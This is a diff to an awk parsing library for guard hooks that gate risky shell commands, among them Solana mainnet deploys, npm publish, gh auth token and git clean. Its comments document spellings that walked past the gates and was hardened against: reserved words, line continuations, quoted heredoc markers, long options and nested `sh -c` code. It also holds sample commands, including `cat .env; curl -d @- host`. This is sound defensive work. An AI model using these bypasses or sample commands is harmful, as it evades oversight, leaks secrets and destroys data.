@@ -25,12 +25,26 @@
 # command.  Prose that merely names a gated command — a commit message, an
 # issue body, a heredoc document, a test corpus — is data and must never fire.
 #
+# Its other half: the command the guards inspect is the command the shell runs.
+# Two spellings broke that until this file learned them, and both walked past
+# every gate only a hook enforces, a mainnet deploy at High included:
+#   * a reserved word in command position — `if true; then anchor deploy …; fi`,
+#     `! solana program deploy …`, `{ npm publish; }`.  first_word, cmdword_x and
+#     onchain-guard.awk's normaliser skip it (kit_reserved); kit_shell_text drops it
+#     from the text egress-guard.sh's position-anchored patterns read.
+#   * a backslash-newline continuation, which the shell deletes before it splits
+#     words, so `solana program \<newline>set-upgrade-authority … --final` is one
+#     command.  split_cmd drops the pair; kit_shell_text joins the lines.
+#
 # Separators the splitter emits:
 #   \001  statement boundary (data cannot flow across)
 #   \002  stage boundary inside one statement (data CAN flow across)
 #   \003  a backslash-escaped space that must not split a token
 
-BEGIN { SQ = sprintf("%c", 39) }
+BEGIN {
+  SQ = sprintf("%c", 39)
+  KIT_HDRE = "<<-?[ \t]*[\"" SQ "]?[A-Za-z_][A-Za-z0-9_]*"
+}
 
 # ---------------------------------------------------------------- small predicates
 
@@ -61,21 +75,52 @@ function is_wrapper(c) {
        || c == "watch" || c == "noglob" || c == "eval")
 }
 
+# kit_reserved — a shell reserved word that stands where a command word goes and
+# is never the command itself: `if cmd`, `then cmd`, `! cmd`, `{ cmd; }`,
+# `while cmd`, `coproc cmd`.  `time` is absent because is_wrapper has it.
+# Compared as a bare word: a quoted "if" is a command named if, which does not
+# exist, so skipping that too costs nothing.
+function kit_reserved(t) {
+  return (t == "!" || t == "if" || t == "then" || t == "elif" || t == "else" || t == "do" \
+       || t == "while" || t == "until" || t == "{" || t == "coproc")
+}
+
 # kit_wrapper_optarg — a wrapper OPTION that swallows the next word, so the word
 # is not mistaken for the command: env -u HOME, xargs -I {}, nice -n 5,
 # sudo -u me, timeout -s KILL 5.  Skipping the flag alone left `nice -n 5 git
 # --no-pager clean -fdx` with "5" in command position and every git gate silent.
 # Moved here from onchain-guard.awk, which had it first and still uses it; only
-# callers passing operands=1 to cmdword_x get it there, beside kit_wrapper_operand.
-# Short options only, as before: an attached value (-n5) or a GNU long option with
-# `=` is one token already, and a spaced long option (--signal KILL) still misses.
+# callers passing operands=1 to cmdword_x get it there, beside kit_wrapper_operand,
+# and so does hd_cmd, the heredoc classifier's walk to the command a body feeds.
+# An attached value (-n5, --adjustment=5) is one token already.  The spaced GNU
+# long forms of the same options (--signal KILL, --adjustment 5, --user me) sit
+# beside them and match by prefix, because getopt_long takes an unambiguous
+# abbreviation: `nice --adj 5` is `nice --adjustment 5`.  Only options whose
+# argument is REQUIRED belong here: `xargs --max-lines 5 cmd` runs `5`, because
+# an optional argument has to be attached with `=`.
 function kit_wrapper_optarg(b, f) {
-  return (b == "env" && f ~ /^(-u|-C|--unset|--chdir)$/) \
-      || (b == "xargs" && f ~ /^(-I|-L|-n|-P|-s|-d|-E|-a|-J|-R|-S)$/) \
-      || ((b == "sudo" || b == "doas") && f ~ /^-[ugphCDrtTU]$/) \
-      || (b == "nice" && f == "-n") || (b == "timeout" && f ~ /^-[sk]$/) \
-      || (b == "stdbuf" && f ~ /^-[ioe]$/) || (b == "exec" && f == "-a") \
-      || (b == "time" && f ~ /^-[fo]$/)
+  if (b == "env") return (f ~ /^-[uC]$/ || kit_long_arg(f, "unset chdir"))
+  if (b == "xargs")
+    return (f ~ /^-[ILnPsdEaJRS]$/ || kit_long_arg(f, "max-args max-procs max-chars delimiter arg-file"))
+  if (b == "sudo" || b == "doas")
+    return (f ~ /^-[ughpCDrtTU]$/ \
+         || kit_long_arg(f, "user group prompt host close-from chdir role type command-timeout other-user"))
+  if (b == "nice") return (f == "-n" || kit_long_arg(f, "adjustment"))
+  if (b == "timeout") return (f ~ /^-[sk]$/ || kit_long_arg(f, "signal kill-after"))
+  if (b == "stdbuf") return (f ~ /^-[ioe]$/ || kit_long_arg(f, "input output error"))
+  if (b == "exec") return (f == "-a")
+  if (b == "time") return (f ~ /^-[fo]$/ || kit_long_arg(f, "format output"))
+  return 0
+}
+
+# kit_long_arg — f is `--<prefix>` of one of the long option names in opts.  A
+# prefix the real program finds ambiguous ends in a usage error, so reading it as
+# the option costs nothing.
+function kit_long_arg(f, opts,   n, O, i) {
+  if (f !~ /^--[A-Za-z]/ || index(f, "=") > 0) return 0
+  n = split(opts, O, " ")
+  for (i = 1; i <= n; i++) if (index("--" O[i], f) == 1) return 1
+  return 0
 }
 
 # kit_wrapper_operand — a wrapper taking a POSITIONAL operand before the command
@@ -97,14 +142,17 @@ function kit_wrapper_operand(w, t) {
 # split_cmd — quote-aware split into statements and pipeline stages.  Honours
 # SQ..SQ (fully literal) and ".." (literal except $( ) and backticks), keeps
 # ${VAR} as one token rather than reading { as a brace group, and turns a command
-# substitution into a stage of its own.
+# substitution into a stage of its own.  A backslash-newline outside SQ..SQ is a
+# line continuation and is dropped whole, as the shell drops it: kept, the newline
+# landed inside a token, and `git config \<newline>core.hooksPath x` had a key
+# no gate recognised.
 function split_cmd(s,   i, c, c2, st, sp, out, j) {
   out = ""; sp = 0; st[0] = "code"
   for (i = 1; i <= length(s); i++) {
     c = substr(s, i, 1); c2 = substr(s, i, 2)
     if (st[sp] == "sq") { out = out c; if (c == SQ) sp--; continue }
     if (st[sp] == "dq") {
-      if (c == "\\" && i < length(s)) { out = out substr(s, i+1, 1); i++; continue }
+      if (c == "\\" && i < length(s)) { i++; if (substr(s, i, 1) != "\n") out = out substr(s, i, 1); continue }
       if (c2 == "$(") { out = out " $__X__\002 "; st[++sp] = "code"; i++; continue }
       if (c == "`")   { out = out " $__X__\002 "; st[++sp] = "bt"; continue }
       if (c == "\"")  { sp--; out = out c; continue }
@@ -112,6 +160,7 @@ function split_cmd(s,   i, c, c2, st, sp, out, j) {
     }
     if (c == "\\" && i < length(s)) {
       i++; c = substr(s, i, 1)
+      if (c == "\n") continue
       if (c == " ") out = out "\003"; else out = out c
       continue
     }
@@ -145,10 +194,11 @@ function tokenize(s, T, Q,   i, c, q, cur, n, hadq) {
   return n
 }
 
-# first_word — index of the first token that is not a VAR=value assignment.
+# first_word — index of the first token that is neither a VAR=value assignment
+# nor a reserved word (`if FOO=1 cmd`, `! cmd`, `then cmd`).
 function first_word(T, n,   i) {
   i = 1
-  while (i <= n && T[i] ~ /^[A-Za-z_][A-Za-z0-9_]*=/) i++
+  while (i <= n && (T[i] ~ /^[A-Za-z_][A-Za-z0-9_]*=/ || kit_reserved(T[i]))) i++
   return i
 }
 
@@ -164,13 +214,16 @@ function first_word(T, n,   i) {
 #
 # CWI is left untouched when reskip is 1 and nothing was found, because that copy
 # never assigned it there and a caller may still be reading the previous value.
+#
+# A reserved word behind a wrapper is skipped as well: bash's `time` is a keyword
+# that takes `!` after it (`time ! cmd`), and on any other wrapper the word would
+# name a command that does not exist.  Never read past n: tokenize leaves the
+# previous stage's tokens above it.
 function cmdword_x(T, n, reskip, operands,   ci, w) {
   ci = first_word(T, n)
   while (ci <= n) {
-    if (reskip) {
-      while (ci <= n && T[ci] ~ /^[A-Za-z_][A-Za-z0-9_]*=/) ci++
-      if (ci > n) return ""
-    }
+    while (ci <= n && (kit_reserved(T[ci]) || (reskip && T[ci] ~ /^[A-Za-z_][A-Za-z0-9_]*=/))) ci++
+    if (ci > n) { if (reskip) return ""; break }
     w = base(T[ci])
     if (!kit_wrapper(w)) { CWI = ci; return w }
     ci++
@@ -184,7 +237,91 @@ function cmdword_x(T, n, reskip, operands,   ci, w) {
   return ""
 }
 
+# kit_inline_code — index of the token a stage runs as shell code: the string a
+# shell takes with -c (`sh -c '…'`, `bash -lc "…"`) or eval's argument, past any
+# non-shell wrapper in front; 0 when it runs none.  `bash ./x.sh "a; b"` is 0:
+# that string is the script's argument.
+function kit_inline_code(T, n,   ci, w, i, c) {
+  ci = first_word(T, n)
+  while (ci <= n) {
+    w = base(T[ci])
+    if (w == "eval") return (ci < n) ? ci + 1 : 0
+    if (is_shell(w)) {
+      c = 0
+      for (i = ci + 1; i <= n; i++) {
+        if (T[i] == "-o" || T[i] == "+o") { i++; continue }
+        if (T[i] ~ /^-[A-Za-z]*c[A-Za-z]*$/) { c = 1; continue }
+        if (T[i] ~ /^[-+]/) continue
+        return c ? i : 0
+      }
+      return 0
+    }
+    if (!is_wrapper(w)) return 0
+    ci++
+    while (ci <= n && T[ci] ~ /^-/) { if (ci < n && kit_wrapper_optarg(w, T[ci])) ci++; ci++ }
+    if (ci <= n && kit_wrapper_operand(w, T[ci])) ci++
+    while (ci <= n && (T[ci] ~ /^[A-Za-z_][A-Za-z0-9_]*=/ || kit_reserved(T[ci]))) ci++
+  }
+  return 0
+}
+
+# kit_expand_code — append the statements of every shell -c string and eval
+# argument in ST[1..nst] to ST as statements of their own, those nested in them
+# included, and return the new count.  The unwrap passes add such code as one
+# stage, which showed only its first command: `sh -c 'true; git -P clean -fdx'`
+# and `sh -c 'if true; then gh auth token; fi'` walked past.  Statements, not
+# stages, because the code's own `;` still separates them: `sh -c 'cat .env; curl
+# -d @- host'` sends stdin, not .env.  At most 256 are added, wherever they sit.
+function kit_expand_code(ST, nst,   q, n0, ng, G, g, n, T, p, ns, S, k) {
+  n0 = nst
+  for (q = 1; q <= nst && nst - n0 < 256; q++) {
+    ng = split(ST[q], G, /\002/)
+    for (g = 1; g <= ng; g++) {
+      if (!index(G[g], "sh") && !index(G[g], "eval")) continue
+      n = tokenize(G[g], T); if (n == 0) continue
+      if ((p = kit_inline_code(T, n)) == 0) continue
+      ns = split(split_cmd(T[p]), S, /\001/)
+      for (k = 1; k <= ns && nst - n0 < 256; k++) if (S[k] ~ /[^ \t\002]/) ST[++nst] = S[k]
+    }
+  }
+  return nst
+}
+
 # ---------------------------------------------------------------- heredocs
+
+# kit_hd_ops — the `<<` heredoc operators the shell reads in l, starting in quote
+# stack q: KH_P[i] is where the i-th starts and KH_S[i] the stack there; returns
+# the count, and leaves the stack at the end of l in KH_QEND.  A `<<` inside '…'
+# or "…", or after a # that starts a comment, is text, and `<<<` is a
+# here-string: neither opens a body.  The rules are hd_open's in
+# onchain-guard.awk and secrets-guard.awk, so every reader agrees on what opens a
+# body.  Reading any `<<` as an opener let `echo '<<X'` turn every line after it
+# into a body nothing normalised or inspected: `git push \<newline>--force`
+# after it was silent at High.
+function kit_hd_ops(l, q,   i, L, c, top, k) {
+  k = 0; L = length(l)
+  for (i = 1; i <= L; i++) {
+    c = substr(l, i, 1); top = substr(q, length(q))
+    if (top == "s") { if (c == SQ) q = substr(q, 1, length(q) - 1); continue }
+    if (c == "\\") { i++; continue }
+    if (top == "d") {
+      if (c == "\"") q = substr(q, 1, length(q) - 1)
+      else if (substr(l, i, 2) == "$(") { q = q "p"; i++ }
+      else if (c == "`") q = q "b"
+      continue
+    }
+    if (c == SQ) q = q "s"
+    else if (c == "\"") q = q "d"
+    else if (c == "`") q = (top == "b") ? substr(q, 1, length(q) - 1) : q "b"
+    else if (c == "(") q = q "p"
+    else if (c == ")") { if (top == "p") q = substr(q, 1, length(q) - 1) }
+    else if (c == "#" && (i == 1 || substr(l, i - 1, 1) ~ /[ \t;&|(]/)) break
+    else if (substr(l, i, 3) == "<<<") i += 2
+    else if (substr(l, i, 2) == "<<") { KH_P[++k] = i; KH_S[k] = q; i++ }
+  }
+  KH_QEND = q
+  return k
+}
 
 # strip_heredocs — drop heredoc BODIES from a raw multi-line command, returning
 # what is left.  A document that merely names a gated command or a credential
@@ -193,11 +330,11 @@ function cmdword_x(T, n, reskip, operands,   ci, w) {
 # One exception: an UNQUOTED delimiter feeding something that executes its input
 # is code, not prose, so that body is kept and inspected.  The caller decides
 # what executes its input, via kit_heredoc_is_code.
-function strip_heredocs(raw,   text, delim, nl, L, k, l, t, quoted, d, head, hn, HT, HQ, hw, HD_DQ, HD_SQ, HD_BARE) {
+function strip_heredocs(raw,   text, delim, nl, L, k, l, t, quoted, d, head, hn, HT, HQ, hw, HD_DQ, HD_SQ, HD_BARE, q, np, j, at, s) {
   HD_DQ = "<<-?[ \t]*\"[A-Za-z_][A-Za-z0-9_]*\""
   HD_SQ = "<<-?[ \t]*" SQ "[A-Za-z_][A-Za-z0-9_]*" SQ
   HD_BARE = "<<-?[ \t]*[A-Za-z_][A-Za-z0-9_]*"
-  text = ""; delim = ""
+  text = ""; delim = ""; q = ""
   nl = split(raw, L, "\n")
   for (k = 1; k <= nl; k++) {
     l = L[k]
@@ -206,9 +343,13 @@ function strip_heredocs(raw,   text, delim, nl, L, k, l, t, quoted, d, head, hn,
       if (t == delim) delim = ""
       continue
     }
-    quoted = 0
-    if (match(l, HD_DQ) || match(l, HD_SQ)) quoted = 1
-    else if (!match(l, HD_BARE)) RSTART = 0
+    np = kit_hd_ops(l, q); q = KH_QEND; RSTART = 0
+    for (j = 1; j <= np && RSTART == 0; j++) {
+      at = KH_P[j]; s = substr(l, at); quoted = 0
+      if (match(s, "^" HD_DQ) || match(s, "^" HD_SQ)) quoted = 1
+      else if (!match(s, "^" HD_BARE)) RSTART = 0
+      if (RSTART > 0) RSTART += at - 1
+    }
     if (RSTART > 0) {
       d = substr(l, RSTART, RLENGTH)
       sub(/^<<-?[ \t]*/, "", d); gsub(/"/, "", d); gsub(SQ, "", d)
@@ -219,4 +360,125 @@ function strip_heredocs(raw,   text, delim, nl, L, k, l, t, quoted, d, head, hn,
     text = text l "\n"
   }
   return text
+}
+
+# ---------------------------------------------------------------- the shell's own reading
+
+# kit_qscan — the quote stack after reading l from stack q: s '…', d "…", b `…`,
+# p ( or $( (code again, inside "…" too), and S / D for the quote opening at
+# position codeat, which the caller has identified as a wrapper's code payload
+# (`sh -c "…"`).  The rules are hd_open's in secrets-guard.awk and
+# onchain-guard.awk, so the three agree on what is quoted.  Three globals carry
+# what a caller reading a line in pieces needs:
+#   KQ_CONT     l ends in a backslash-newline continuation: not inside '…', and not
+#               in a comment, which the shell never continues
+#   KQ_COMMENT  a # comment began, so the rest of the line is prose.  It stays set
+#               until the caller clears it at the next line, with KQ_PREV.
+#   KQ_PREV     the last character read, for the next piece's # test
+function kit_qscan(l, q, codeat,   i, L, c, top, p) {
+  KQ_CONT = 0
+  if (KQ_COMMENT) return q
+  L = length(l)
+  for (i = 1; i <= L; i++) {
+    c = substr(l, i, 1); top = substr(q, length(q))
+    if (top == "s" || top == "S") { if (c == SQ) q = substr(q, 1, length(q) - 1); continue }
+    if (c == "\\") { if (i == L) KQ_CONT = 1; i++; continue }
+    if (top == "d" || top == "D") {
+      if (c == "\"") q = substr(q, 1, length(q) - 1)
+      else if (substr(l, i, 2) == "$(") { q = q "p"; i++ }
+      else if (c == "`") q = q "b"
+      continue
+    }
+    if (c == SQ) q = q (i == codeat ? "S" : "s")
+    else if (c == "\"") q = q (i == codeat ? "D" : "d")
+    else if (c == "`") q = (top == "b") ? substr(q, 1, length(q) - 1) : q "b"
+    else if (c == "(") q = q "p"
+    else if (c == ")") { if (top == "p") q = substr(q, 1, length(q) - 1) }
+    else if (c == "#") {
+      p = (i == 1) ? KQ_PREV : substr(l, i - 1, 1)
+      if (p == "" || p ~ /[ \t;&|(]/) { KQ_COMMENT = 1; break }
+    }
+  }
+  # Ending on a continuation, the character the next line follows is the one
+  # before the backslash, since the shell deletes the pair.
+  if (KQ_CONT) { if (L > 1) KQ_PREV = substr(l, L - 1, 1) }
+  else if (L > 0) KQ_PREV = substr(l, L, 1)
+  return q
+}
+
+# kit_code_top — text read in stack q is code: unquoted, in $( ), ( ) or `…`, or in
+# a code payload.  Inside a plain '…' or "…" it is an argument, however much it
+# looks like a command.
+function kit_code_top(q,   t) {
+  t = substr(q, length(q))
+  return (t == "" || t == "p" || t == "b" || t == "S" || t == "D")
+}
+
+# kit_unreserve — st without the reserved words leading it, its indent kept.
+function kit_unreserve(st,   lead) {
+  lead = st; sub(/[^ \t].*$/, "", lead)
+  st = substr(st, length(lead) + 1)
+  while (match(st, /^[^ \t]+/) && kit_reserved(substr(st, 1, RLENGTH))) {
+    st = substr(st, RLENGTH + 1); sub(/^[ \t]+/, "", st)
+  }
+  return lead st
+}
+
+# kit_shell_text — raw as the shell reads it, for the guards that match a regex
+# over the text rather than walking tokens.  Every backslash-newline outside '…'
+# is joined, as the shell joins it before splitting words; with kw set, the
+# reserved words leading a command outside quotes are dropped as well, so
+# `if true; then npm publish; fi` reads `true; npm publish; fi`.  The statement
+# separators are the ones onchain-guard.awk splits on, read the same way.
+# Nothing else changes: a text with neither comes back byte for byte, which is
+# what keeps every other verdict where it was.
+#
+# A heredoc body is copied untouched, since a document's `\` and `then` are not
+# the shell's.  Only an operator the shell reads opens one (kit_hd_ops), quoted
+# delimiter or not: a `<<` inside quotes or a comment is text, and reading it as
+# an opener switched the normalising off for every line after `echo '<<X'`.
+function kit_shell_text(raw, kw,   nl, L, k, l, out, first, q, qj, nd, di, D, t, s, d, rest, st, sep, cmd, np, j) {
+  if (!kw && index(raw, "\\\n") == 0) return raw
+  nl = split(raw, L, "\n")
+  out = ""; first = 1; q = ""; nd = 0; di = 0
+  for (k = 1; k <= nl; k++) {
+    l = L[k]
+    if (di < nd) {
+      t = l; gsub(/^[ \t]+|[ \t]+$/, "", t)
+      if (t == D[di + 1]) di++
+    } else {
+      # Each physical line is read once, from the state the last one left: a
+      # rescan of the growing line per continuation was quadratic, and a hook
+      # padded past its timeout does not block the call.
+      KQ_PREV = ""; KQ_COMMENT = 0; qj = kit_qscan(l, q, 0)
+      while (KQ_CONT && k < nl) {
+        l = substr(l, 1, length(l) - 1)
+        qj = kit_qscan(L[++k], qj, 0)
+        l = l L[k]
+      }
+      np = (index(l, "<<") > 0) ? kit_hd_ops(l, q) : 0
+      for (j = 1; j <= np; j++) {
+        if (!match(substr(l, KH_P[j]), "^" KIT_HDRE)) continue
+        d = substr(l, KH_P[j], RLENGTH)
+        sub(/^<<-?[ \t]*/, "", d); gsub(/"/, "", d); gsub(SQ, "", d)
+        D[++nd] = d
+      }
+      if (!kw) q = qj
+      else {
+        KQ_PREV = ""; KQ_COMMENT = 0
+        rest = l; l = ""
+        while (length(rest)) {
+          if (match(rest, /(\|\||&&|\$\(|[;&|()])/)) {
+            st = substr(rest, 1, RSTART - 1); sep = substr(rest, RSTART, RLENGTH)
+            rest = substr(rest, RSTART + RLENGTH)
+          } else { st = rest; sep = ""; rest = "" }
+          cmd = !KQ_COMMENT && kit_code_top(q)
+          q = kit_qscan(st sep, q, 0)
+          l = l (cmd ? kit_unreserve(st) : st) sep
+        }
+      }
+    }
+    out = first ? l : out "\n" l; first = 0
+  }
+  return out
 }
